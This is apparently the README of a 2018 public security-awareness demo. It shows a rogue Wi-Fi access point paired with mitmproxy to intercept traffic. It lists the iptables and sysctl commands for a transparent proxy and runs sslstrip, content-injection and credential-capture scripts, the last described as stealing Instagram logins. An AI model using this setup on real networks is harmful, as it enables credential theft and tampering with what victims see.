Punti Deboli
============
Demo for VenetoNight 2018 involving MITM on several websites to showcase classic network attacker's capabilities


Setup
-----
Laptop is required to be connected using the eth adapter and serve a malicious AP using a compatible wifi card. NetworkManager is enough to setup the AP.

### Low-level netowrk setup

Enable ip forward

	# sysctl -w net.ipv4.ip_forward=1

Disable ICMP redirects

	# sysctl -w net.ipv4.conf.all.send_redirects=0

Apply firewall rules to enable transparent proxy (consider using appropriate names for the network devices)

	# iptables -t nat -I PREROUTING -i wlp2s0 -p tcp --dport 80 -j REDIRECT --to-port 8080
	# iptables -t nat -I PREROUTING -i wlp2s0 -p tcp --dport 443 -j REDIRECT --to-port 8080
	# iptables -t nat -I POSTROUTING -o enx00e04c68a1d8 -j MASQUERADE


### Proxy

Install [mitmproxy](https://mitmproxy.org/)

	$ virtualenv -p /usr/bin/python3 venv
	$ . venv/bin/activate
	(venv) $ pip install mitmproxy

Run it with the provided scripts

	(venv) $ mitmweb --showhost --mode transparent -s scripts/sslstrip.py -s scripts/flip.py -s scripts/instasnarf.py -s scripts/fake.py

Or you can use `mitmdump -q -w /dev/null ...` to supress output log and avoid to spawn a browser instance.


Demo
----
Users are asked to access some websites, leading to different outcomes:

* any website using HTTP or HTTPS without HSTS: images are rotated of 180 deg. Few examples: http://www.italia.it, http://www.governo.it.
* corriere.it: although the site is in HTTPS, we add one fake news about c00kies doing a nasty hack against the The Pentagon
* instagram.com: even if it's one of the top websites and it support HTTPS, it does not implement HSTS so it's possible to steal login credentials